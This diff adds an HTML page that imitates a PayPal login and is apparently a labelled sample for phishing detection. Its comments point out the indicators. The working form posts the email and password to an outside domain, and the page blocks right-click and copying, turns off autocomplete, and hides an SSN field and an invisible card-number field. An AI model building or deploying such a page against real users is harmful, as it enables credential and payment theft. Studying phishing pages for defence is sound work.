@@ -1,0 +1,126 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Secure PayPal Login - Verify Account</title>
+  <style>
+    body {
+      font-family: -apple-system, system-ui, sans-serif;
+      background: #f4f6f9;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      margin: 0;
+    }
+    .login-card {
+      background: #ffffff;
+      padding: 40px;
+      border-radius: 12px;
+      box-shadow: 0 4px 20px rgba(0,0,0,0.08);
+      width: 360px;
+      text-align: center;
+    }
+    .brand-logo {
+      font-size: 28px;
+      font-weight: 800;
+      color: #003087;
+      margin-bottom: 20px;
+      letter-spacing: -1px;
+    }
+    .brand-logo span {
+      color: #0079c1;
+    }
+    .input-group {
+      margin-bottom: 15px;
+      text-align: left;
+    }
+    label {
+      display: block;
+      font-size: 12px;
+      font-weight: 600;
+      color: #333;
+      margin-bottom: 5px;
+    }
+    input[type="text"], input[type="password"] {
+      width: 100%;
+      padding: 12px;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+      box-sizing: border-box;
+      font-size: 14px;
+    }
+    .btn-submit {
+      width: 100%;
+      padding: 12px;
+      background: #0079c1;
+      color: #fff;
+      border: none;
+      border-radius: 20px;
+      font-size: 15px;
+      font-weight: 700;
+      cursor: pointer;
+      margin-top: 15px;
+    }
+    .btn-submit:hover {
+      background: #005ea6;
+    }
+    .footer-links {
+      margin-top: 20px;
+      font-size: 12px;
+      color: #666;
+    }
+  </style>
+  <script>
+    // ⚠ SIMULATING PHISHING DOM BEHAVIORS:
+    
+    // 1. Right-click blocker (Anti-Inspection check)
+    document.addEventListener('contextmenu', function(e) {
+      e.preventDefault();
+      alert("Right-click is disabled for security reasons.");
+    });
+
+    // 2. Copy blocker
+    document.addEventListener('copy', function(e) {
+      e.preventDefault();
+    });
+  </script>
+</head>
+<body>
+
+  <div class="login-card">
+    <div class="brand-logo">Pay<span>Pal</span></div>
+    
+    <!-- 
+      ⚠ Phishing Indicators in this Form:
+      1. Action points to a completely different domain (cross-origin form action)
+      2. Autocomplete is turned off on username/password fields to block managers
+    -->
+    <form action="https://fake-paypal-action-verifier.net/login.php" method="POST">
+      
+      <!-- Hidden honeypot data exfiltration fields -->
+      <input type="hidden" name="user_secret_ssn" value="382-901-22">
+
+      <div class="input-group">
+        <label for="email">Email address</label>
+        <input type="text" id="email" name="user_email" autocomplete="off" placeholder="Enter your email" required>
+      </div>
+
+      <div class="input-group">
+        <label for="password">Password</label>
+        <input type="password" id="password" name="user_password" autocomplete="off" placeholder="Enter your password" required>
+      </div>
+
+      <!-- Zero-opacity honeypot field -->
+      <input type="text" name="cc_number" style="opacity: 0; position: absolute; height: 1px; width: 1px; z-index: -1;">
+
+      <button type="submit" class="btn-submit">Log In</button>
+    </form>
+
+    <div class="footer-links">
+      <p>Having trouble logging in? <a href="#">Recover Account</a></p>
+    </div>
+  </div>
+
+</body>
+</html>
